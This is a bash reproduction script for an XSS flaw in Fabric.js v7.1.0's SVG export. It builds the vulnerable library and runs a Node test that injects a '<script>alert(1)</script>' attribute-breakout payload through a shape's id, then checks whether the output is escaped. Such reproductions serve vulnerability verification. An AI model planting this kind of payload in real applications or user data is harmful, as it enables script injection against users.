#!/bin/bash
set -euo pipefail

# Portable root detection - works anywhere
ROOT="${PRUVA_ROOT:-$(cd "$(dirname "$0")/.." && pwd)}"
LOGS="$ROOT/logs"
mkdir -p "$LOGS"

cd "$ROOT"

echo "=== Fabric.js XSS Reproduction via SVG Export ==="
echo "CVE: CVE-2026-27013 / GHSA-hfvx-25r5-qc3w"
echo ""

# Clone and build vulnerable fabric.js if not present
if [ ! -f "$ROOT/repro/fabric.js/dist/index.node.cjs" ]; then
  echo "[*] Cloning fabric.js v7.1.0 (vulnerable)..."
  mkdir -p "$ROOT/repro"
  git clone --depth 1 --branch v7.1.0 https://github.com/fabricjs/fabric.js.git "$ROOT/repro/fabric.js" 2>&1 | tail -3
  echo "[*] Installing dependencies..."
  cd "$ROOT/repro/fabric.js"
  npm install --ignore-scripts 2>&1 | tail -5
  echo "[*] Building fabric.js..."
  npm run build 2>&1 | tail -5
  cd "$ROOT"
  echo "[*] Build complete"
  echo ""
fi

# Create the reproduction test script
cat > "$ROOT/test_xss.js" << 'TESTEOF'
const { Rect, StaticCanvas } = require('./repro/fabric.js/dist/index.node.cjs');

console.log("Testing XSS via id property injection...");

// Create a malicious payload that breaks out of id attribute
const xssPayload = '"><script>alert(1)</script><rect id="';

// Create a Rect with the malicious id
const rect = new Rect({
  width: 100,
  height: 100,
  fill: 'red',
  id: xssPayload
});

// Export to SVG
const svg = rect.toSVG();
console.log("\n=== Generated SVG ===");
console.log(svg);
console.log("=== End SVG ===\n");

// Check if the payload is escaped or not
const escapedPayload = '&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;rect id=&quot;';
const isEscaped = svg.includes(escapedPayload);
const isUnescaped = svg.includes(xssPayload);

console.log("Payload analysis:");
console.log(`- Is escaped: ${isEscaped}`);
console.log(`- Is unescaped: ${isUnescaped}`);

if (isUnescaped && !isEscaped) {
  console.log("\n❌ VULNERABILITY CONFIRMED: Payload is NOT escaped in SVG output!");
  console.log("The id attribute allows XSS injection via SVG export.");
  process.exit(0);  // Vulnerable
} else if (isEscaped && !isUnescaped) {
  console.log("\n✅ VULNERABILITY PATCHED: Payload is properly escaped in SVG output.");
  process.exit(1);  // Not vulnerable (patched)
} else {
  console.log("\n⚠️  AMBIGUOUS: Could not determine vulnerability status.");
  process.exit(2);  // Unclear result
}
TESTEOF

# Run the test
node "$ROOT/test_xss.js" 2>&1 | tee "$LOGS/reproduction.log"

exit_code=${PIPESTATUS[0]}

if [ $exit_code -eq 0 ]; then
  echo ""
  echo "========================================="
  echo "VULNERABILITY CONFIRMED (exit code: 0)"
  echo "========================================="
elif [ $exit_code -eq 1 ]; then
  echo ""
  echo "========================================="
  echo "VULNERABILITY NOT PRESENT (exit code: 1)"
  echo "========================================="
else
  echo ""
  echo "========================================="
  echo "UNCLEAR RESULT (exit code: $exit_code)"
  echo "========================================="
fi

exit $exit_code
